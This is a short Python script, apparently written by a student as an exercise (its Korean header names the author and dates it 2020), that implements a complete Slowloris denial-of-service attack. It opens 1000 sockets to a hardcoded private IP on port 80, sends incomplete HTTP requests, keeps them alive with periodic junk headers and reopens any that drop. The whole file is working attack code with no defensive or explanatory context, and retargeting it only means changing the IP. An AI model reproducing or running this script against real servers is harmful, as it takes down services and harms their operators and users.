#-----------------------------------------------------------------------------------------------------------------------------------------------------

#                                           2020.12.17

#                                     유 주 환 학 생 Slowloris 작 성


import socket, random, time, sys

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []


def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock


if __name__ == "__main__":
    ip = "192.168.219.106"
    count = 1000
    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))

    for _ in range(count):
        try:
            print("Socket {}".format(_))
            sock = setupSocket(ip)
        except socket.error:
            break

        sockets.append(sock)

    while True:
        print("Connected to {} sockets. Sending headers...".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print("Re-opening closed sockets...")
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break

        time.sleep(15)



#-----------------------------------------------------------------------------------------------------------------------------------------------------